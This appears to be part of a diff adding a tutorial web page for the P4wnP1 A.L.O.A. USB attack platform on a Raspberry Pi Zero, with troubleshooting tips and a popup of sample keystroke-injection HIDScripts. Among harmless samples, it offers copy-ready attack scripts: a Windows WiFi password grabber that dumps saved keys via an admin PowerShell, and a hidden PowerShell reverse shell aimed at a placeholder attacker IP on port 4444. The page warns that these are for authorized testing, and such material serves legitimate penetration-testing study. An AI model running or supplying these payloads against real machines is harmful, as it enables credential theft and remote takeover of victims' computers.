+                                        <li>Check that your firewall isn't blocking the connection</li>
+                                        <li>Verify the network adapter has obtained an IP address</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <div class="accordion-header" onclick="toggleAccordion(this)">
+                                <h4>Wrong USB port used</h4>
+                                <i class="fas fa-chevron-down accordion-icon"></i>
+                            </div>
+                            <div class="accordion-content">
+                                <div class="accordion-body">
+                                    <p>The Raspberry Pi Zero has two micro-USB ports:</p>
+                                    <ul>
+                                        <li><strong>Data port (inner):</strong> Use this one - it's closer to the center of the board</li>
+                                        <li><strong>Power port (outer):</strong> This is power-only and won't work for data</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <div class="accordion-header" onclick="toggleAccordion(this)">
+                                <h4>SD card flashing issues</h4>
+                                <i class="fas fa-chevron-down accordion-icon"></i>
+                            </div>
+                            <div class="accordion-content">
+                                <div class="accordion-body">
+                                    <ul>
+                                        <li>Use a high-quality SD card (Class 10 or better)</li>
+                                        <li>Try a different card reader</li>
+                                        <li>Format the SD card before flashing</li>
+                                        <li>Download the image again (may be corrupted)</li>
+                                        <li>Try balenaEtcher if Raspberry Pi Imager fails</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="accordion-item">
+                            <div class="accordion-header" onclick="toggleAccordion(this)">
+                                <h4>Payloads not executing correctly</h4>
+                                <i class="fas fa-chevron-down accordion-icon"></i>
+                            </div>
+                            <div class="accordion-content">
+                                <div class="accordion-body">
+                                    <ul>
+                                        <li>Verify the correct keyboard layout is set (<code>layout("us")</code>)</li>
+                                        <li>Increase delays between commands</li>
+                                        <li>Check for syntax errors in your HIDScript</li>
+                                        <li>Ensure the target system is ready (logged in, focused window)</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Resources -->
+                <section id="resources" class="docs-section">
+                    <h2 class="docs-heading">Resources</h2>
+                    <p>Additional documentation, tools, and community resources.</p>
+                    
+                    <div class="docs-grid-3">
+                        <div class="docs-card">
+                            <h3><i class="fab fa-github"></i> GitHub Repository</h3>
+                            <p>Source code, releases, issues, and contribution guidelines.</p>
+                            <a href="https://github.com/RoganDawes/P4wnP1_aloa" target="_blank" class="docs-link">View Repository</a>
+                        </div>
+                        <div class="docs-card">
+                            <h3><i class="fas fa-book"></i> Wiki & Documentation</h3>
+                            <p>Payload creation, advanced configuration, and customization.</p>
+                            <a href="https://github.com/RoganDawes/P4wnP1_aloa/wiki" target="_blank" class="docs-link">Read the Wiki</a>
+                        </div>
+                        <div class="docs-card">
+                            <h3><i class="fas fa-sd-card"></i> Raspberry Pi Imager</h3>
+                            <p>Official imaging tool for flashing SD cards.</p>
+                            <a href="https://www.raspberrypi.com/software/" target="_blank" class="docs-link">Download Imager</a>
+                        </div>
+                    </div>
+                </section>
+            </article>
+        </main>
+    </div>
+
+    <!-- Sample Scripts Popup -->
+    <div class="scripts-popup-overlay" id="scriptsPopup">
+        <div class="scripts-popup">
+            <div class="scripts-popup-header">
+                <h2><i class="fas fa-code"></i> Sample HIDScripts</h2>
+                <button class="scripts-popup-close" onclick="closeScriptsPopup()">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="scripts-popup-body">
+                <div class="script-tabs">
+                    <button class="script-tab active" onclick="showScript('hello')">Hello World</button>
+                    <button class="script-tab" onclick="showScript('rickroll')">Rickroll</button>
+                    <button class="script-tab" onclick="showScript('wifi')">WiFi Grabber</button>
+                    <button class="script-tab" onclick="showScript('reverse')">Reverse Shell</button>
+                    <button class="script-tab" onclick="showScript('wallpaper')">Wallpaper Change</button>
+                </div>
+
+                <!-- Hello World Script -->
+                <div class="script-content active" id="script-hello">
+                    <p class="script-description">A simple script that opens Notepad and types a message. Great for testing your setup.</p>
+                    <div class="script-code">
+                        <div class="script-code-header">
+                            <span class="script-code-lang">JavaScript</span>
+                            <button class="script-copy-btn" onclick="copyScriptCode('script-hello')">Copy</button>
+                        </div>
+                        <pre><code>// Hello World - Test Script
+layout("us");
+typingSpeed(100, 150);
+
+// Open Run dialog
+press("GUI r");
+delay(500);
+
+// Open Notepad
+type("notepad");
+press("ENTER");
+delay(1000);
+
+// Type message
+type("Hello from P4wnP1 A.L.O.A.!");
+press("ENTER");
+type("Your USB attack platform is working correctly.");</code></pre>
+                    </div>
+                </div>
+
+                <!-- Rickroll Script -->
+                <div class="script-content" id="script-rickroll">
+                    <p class="script-description">Opens a browser and plays "Never Gonna Give You Up" - classic harmless prank.</p>
+                    <div class="script-code">
+                        <div class="script-code-header">
+                            <span class="script-code-lang">JavaScript</span>
+                            <button class="script-copy-btn" onclick="copyScriptCode('script-rickroll')">Copy</button>
+                        </div>
+                        <pre><code>// Rickroll Script
+layout("us");
+typingSpeed(80, 120);
+
+// Open Run dialog
+press("GUI r");
+delay(500);
+
+// Open browser with YouTube video
+type("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+press("ENTER");
+delay(2000);
+
+// Fullscreen (F key on YouTube)
+press("f");</code></pre>
+                    </div>
+                </div>
+
+                <!-- WiFi Grabber Script -->
+                <div class="script-content" id="script-wifi">
+                    <p class="script-description">Extracts saved WiFi passwords from Windows. <strong>Use only on authorized systems!</strong></p>
+                    <div class="script-code">
+                        <div class="script-code-header">
+                            <span class="script-code-lang">JavaScript</span>
+                            <button class="script-copy-btn" onclick="copyScriptCode('script-wifi')">Copy</button>
+                        </div>
+                        <pre><code>// WiFi Password Grabber (Windows)
+// WARNING: Only use on systems you own or have permission to test!
+layout("us");
+typingSpeed(50, 100);
+
+// Open PowerShell as Admin
+press("GUI x");
+delay(300);
+press("a");
+delay(500);
+press("LEFT");
+press("ENTER");
+delay(2000);
+
+// Export WiFi profiles
+type("(netsh wlan show profiles) | Select-String '\\:(.+)$' | ");
+type("%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | ");
+type("%{(netsh wlan show profile name=\"$name\" key=clear)} | ");
+type("Out-File -FilePath $env:TEMP\\wifi.txt");
+press("ENTER");
+delay(2000);
+
+// Open the file
+type("notepad $env:TEMP\\wifi.txt");
+press("ENTER");</code></pre>
+                    </div>
+                </div>
+
+                <!-- Reverse Shell Script -->
+                <div class="script-content" id="script-reverse">
+                    <p class="script-description">Creates a reverse shell connection. <strong>EDUCATIONAL ONLY - Use responsibly!</strong></p>
+                    <div class="script-code">
+                        <div class="script-code-header">
+                            <span class="script-code-lang">JavaScript</span>
+                            <button class="script-copy-btn" onclick="copyScriptCode('script-reverse')">Copy</button>
+                        </div>
+                        <pre><code>// Reverse Shell (PowerShell - Windows)
+// WARNING: This is for authorized penetration testing ONLY!
+// Replace IP and PORT with your listener
+layout("us");
+typingSpeed(30, 60);
+
+var attackerIP = "YOUR_IP_HERE";
+var attackerPort = "4444";
+
+// Open hidden PowerShell
+press("GUI r");
+delay(300);
+type("powershell -w hidden -ep bypass");
+press("ENTER");
+delay(1000);
+
+// Reverse shell one-liner
+type("$c=New-Object Net.Sockets.TCPClient('" + attackerIP + "'," + attackerPort + ");");
+type("$s=$c.GetStream();[byte[]]$b=0..65535|%{0};");
+type("while(($i=$s.Read($b,0,$b.Length)) -ne 0){;");
+type("$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);");
+type("$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';");
+type("$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}");
+press("ENTER");</code></pre>
+                    </div>
+                </div>
+
+                <!-- Wallpaper Change Script -->
+                <div class="script-content" id="script-wallpaper">
+                    <p class="script-description">Downloads and sets a custom wallpaper on Windows.</p>
+                    <div class="script-code">
+                        <div class="script-code-header">
+                            <span class="script-code-lang">JavaScript</span>
+                            <button class="script-copy-btn" onclick="copyScriptCode('script-wallpaper')">Copy</button>
+                        </div>
+                        <pre><code>// Wallpaper Changer (Windows)
+layout("us");
+typingSpeed(40, 80);
+
+var imageUrl = "https://example.com/wallpaper.jpg";
+
+// Open PowerShell
+press("GUI r");
+delay(300);
+type("powershell -ep bypass");
+press("ENTER");
+delay(1000);
+
+// Download and set wallpaper
+type("$url = '" + imageUrl + "'; ");
+type("$path = \"$env:TEMP\\wall.jpg\"; ");
+type("Invoke-WebRequest -Uri $url -OutFile $path; ");
+type("Add-Type -TypeDefinition @\"");
+press("ENTER");
+type("using System.Runtime.InteropServices;");
+press("ENTER");
+type("public class Wallpaper {");
+press("ENTER");
+type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]");
+press("ENTER");
+type("public static extern int SystemParametersInfo(int a, int b, string c, int d);");
+press("ENTER");
+type("}");
+press("ENTER");
+type("\"@; ");
+type("[Wallpaper]::SystemParametersInfo(20, 0, $path, 3)");
+press("ENTER");
+
+delay(500);
+type("exit");
+press("ENTER");</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <div class="footer-content">
+            <div class="footer-brand">
+                <img src="../assets/img/Logo-With-Name.png" alt="Nerd or Geek Logo" class="footer-logo">
+                <p>Tech tutorials, Raspberry Pi projects, and open-source tools.</p>
+            </div>
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h4>Quick Links</h4>
+                    <a href="../index.html">Home</a>
+                    <a href="../projects.html">Projects</a>
+                    <a href="../index.html#affiliates">Affiliates</a>
+                </div>
+                <div class="footer-column">
+                    <h4>Connect</h4>
+                    <a href="https://www.youtube.com/@Nerd-or-Geek" target="_blank"><i class="fab fa-youtube"></i> YouTube</a>
+                    <a href="https://github.com/Nerd-or-Geek" target="_blank"><i class="fab fa-github"></i> GitHub</a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2026 Nerd or Geek? All rights reserved.</p>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="../dist/scripts/main.js" type="module"></script>
+    <script>
+        // Scripts Popup Functions
+        function openScriptsPopup() {
+            document.getElementById('scriptsPopup').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeScriptsPopup() {
+            document.getElementById('scriptsPopup').classList.remove('active');
+            document.body.style.overflow = '';
+        }
+
+        function showScript(scriptId) {
+            // Remove active from all tabs and contents
+            document.querySelectorAll('.script-tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.script-content').forEach(content => content.classList.remove('active'));
+            
+            // Add active to clicked tab and corresponding content
+            event.target.classList.add('active');
+            document.getElementById('script-' + scriptId).classList.add('active');
+        }
+
+        function copyScriptCode(containerId) {
+            const container = document.getElementById(containerId);
+            const code = container.querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                const btn = container.querySelector('.script-copy-btn');
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 2000);
+            });
+        }
+
+        // Close popup on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeScriptsPopup();
+            }
+        });
+
+        // Close popup when clicking overlay
+        document.getElementById('scriptsPopup').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeScriptsPopup();
+            }
+        });
+
+        // Accordion Functions
+        function toggleAccordion(header) {
+            const item = header.parentElement;
+            const wasActive = item.classList.contains('active');
+            
+            // Close all items
+            document.querySelectorAll('.accordion-item').forEach(i => i.classList.remove('active'));
+            
+            // Open clicked item if it wasn't active
+            if (!wasActive) {
+                item.classList.add('active');
+            }
+        }
+
+        // Copy code function for main code blocks
+        function copyCode(button) {
+            const codeBlock = button.closest('.docs-code-block');
+            const code = codeBlock.querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                button.textContent = 'Copied!';
+                setTimeout(() => button.textContent = 'Copy', 2000);
+            });
+        }
+    </script>
+</body>
+</html>
